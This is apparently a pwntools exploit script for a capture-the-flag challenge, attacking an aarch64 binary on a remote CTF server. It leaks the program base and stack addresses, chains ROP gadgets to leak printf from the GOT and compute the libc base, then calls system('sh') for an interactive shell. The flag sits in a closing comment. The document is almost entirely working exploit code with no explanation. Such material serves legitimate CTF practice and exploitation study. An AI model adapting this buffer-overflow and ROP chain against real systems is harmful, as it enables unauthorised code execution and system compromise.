from pwn import *
p = remote('pwn.zh3r0.cf','1111')
#p = process(['./qemu-aarch64','-L','.','-g','1234','./vuln']) 
elf = ELF('./vuln')
libc = ELF('./lib/libc.so.6')

context.binary = elf
context.log_level='debug'
p.recvuntil('Enter your name: ')
payload = b'A'*0x8
p.send(payload)
p.recvuntil(b'A'*0x8)
base = u32(p.recv(4))-0x8A8
p.info('base: '+hex(base))
p.recvuntil('send me your message now: ')

p.send(b'A'*40+p64(base+0x884))
p.recvuntil('Enter your name: ')
payload = b'A'
p.send(payload)
p.recvuntil('Hello, ')
stack = u64(p.recv(6)+b'\x00\x00')-0x41+0xD0
#stack = u64(p.recv(6)+b'\x00\x00')-0x41+0xC0
p.info('stack: '+hex(stack))
p.recvuntil('send me your message now: ')
payload = p64(base+0x848)
payload = payload.ljust(40,b'A')
payload+= p64(base+0x920)
#ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
payload+= p64(0) #x29
payload+= p64(base+0x900) #x30
#ldr x3, [x21, x19, lsl #3] ; mov x2, x24 ; add x19, x19, #1 ; mov x1, x23 ; mov w0, w22 ; blr x3
payload+= p64(0) #x19
payload+= p64(0) #x20
payload+= p64(stack) #x21
payload+= p64(base+elf.got['printf']) #x22
payload+= p64(base+elf.got['printf']) #x23
payload+= p64(0) #x24
payload+= p64(base+0x884) #main
payload+= p64(base+0x884) #main
p.send(payload)
p.recvuntil('Hello, ')
libc_base = u32(p.recv(4))-libc.sym['printf']
p.info('libc_base: '+hex(libc_base))
p.send(b'B')

p.recvuntil('Enter your name: ')
payload = b'A'
p.send(payload)
p.recvuntil('Hello, ')
stack = u64(p.recv(6)+b'\x00\x00')-0x41+0x30+0x10
p.info('stack: '+hex(stack))
p.recvuntil('send me your message now: ')
payload = p64(libc_base+libc.sym['system'])
payload = payload.ljust(40,b'C')
payload+= p64(base+0x920)
payload+= p64(0) #x29
payload+= p64(base+0x900) #x30
payload+= p64(0) #x19
payload+= p64(0) #x20
payload+= p64(stack) #x21
payload+= p64(base+0x3FF) #x22 #sh=base+0x3FF
payload+= p64(0) #x23
payload+= p64(0) #x24
payload+= p64(base+0x884) #main
payload+= p64(base+0x884) #main
p.send(payload)
p.interactive()
#zh3r0{b4by_aaarch64_r0p_f04_fun_4nd_pr0fit}

